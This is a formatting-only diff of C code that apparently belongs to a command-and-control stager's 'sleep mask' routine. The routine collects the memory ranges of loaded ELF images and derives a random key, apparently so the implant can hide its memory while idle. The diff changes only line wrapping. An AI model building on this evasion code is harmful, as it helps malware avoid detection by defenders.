@@ -211,8 +211,8 @@ static int elf_open(uintptr_t base, uintptr_t map_end, struct mask_elf *e) {
   return 1;
 }
 
-static int range_present(const struct c2_map *ranges, size_t n,
-                         uintptr_t start, uintptr_t end) {
+static int range_present(const struct c2_map *ranges, size_t n, uintptr_t start,
+                         uintptr_t end) {
   for (size_t i = 0; i < n; i++)
     if (ranges[i].start == start && ranges[i].end == end)
       return 1;
@@ -234,12 +234,13 @@ static int map_excluded(const struct c2_map *m, uintptr_t fs_base,
 }
 
 /* Add every mapping that overlaps one of an image's PT_LOAD segments. */
-static size_t add_image_ranges(struct mask_scratch *sc, const struct mask_elf *e,
-                               size_t nmaps, uintptr_t keep_start,
-                               uintptr_t keep_end, uintptr_t scratch_start,
-                               uintptr_t scratch_end, uintptr_t fs_base,
-                               uintptr_t gs_base, uintptr_t code_probe,
-                               uintptr_t code_end, size_t n) {
+static size_t add_image_ranges(struct mask_scratch *sc,
+                               const struct mask_elf *e, size_t nmaps,
+                               uintptr_t keep_start, uintptr_t keep_end,
+                               uintptr_t scratch_start, uintptr_t scratch_end,
+                               uintptr_t fs_base, uintptr_t gs_base,
+                               uintptr_t code_probe, uintptr_t code_end,
+                               size_t n) {
   struct c2_map *maps = sc->maps;
   struct c2_map *ranges = sc->ranges;
   for (size_t i = 0; i < nmaps; i++) {
@@ -253,8 +254,8 @@ static size_t add_image_ranges(struct mask_scratch *sc, const struct mask_elf *e
         break;
       }
     }
-    if (!belongs || map_excluded(&maps[i], fs_base, gs_base, code_probe,
-                                 code_end))
+    if (!belongs ||
+        map_excluded(&maps[i], fs_base, gs_base, code_probe, code_end))
       continue;
     if (range_present(ranges, n, maps[i].start, maps[i].end))
       continue;
@@ -346,9 +347,9 @@ static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
     struct mask_elf image;
     if (!elf_open(maps[i].start, maps[i].end, &image))
       continue;
-    n = add_image_ranges(sc, &image, nmaps, keep_start, keep_end,
-                         scratch_start, scratch_end, fs_base, gs_base,
-                         code_probe, code_end, n);
+    n = add_image_ranges(sc, &image, nmaps, keep_start, keep_end, scratch_start,
+                         scratch_end, fs_base, gs_base, code_probe, code_end,
+                         n);
   }
   return n;
 }
@@ -382,7 +383,8 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
   if (sc == MAP_FAILED)
     return -1;
   struct c2_map *ranges = sc->ranges;
-  size_t n = find_ranges(sc, keep_start, keep_end, fs_base, gs_base, code_probe);
+  size_t n =
+      find_ranges(sc, keep_start, keep_end, fs_base, gs_base, code_probe);
   if (n == 0) {
     munmap(sc, sizeof(*sc));
     return -1;
@@ -398,8 +400,7 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
     }
 
   uint8_t key[MASK_KEY_LEN];
-  if (mask_syscall(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) !=
-      MASK_KEY_LEN) {
+  if (mask_syscall(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) != MASK_KEY_LEN) {
     for (size_t i = 0; i < sizeof(key); i++)
       key[i] = (uint8_t)(i * 131u + (unsigned)seconds);
   }
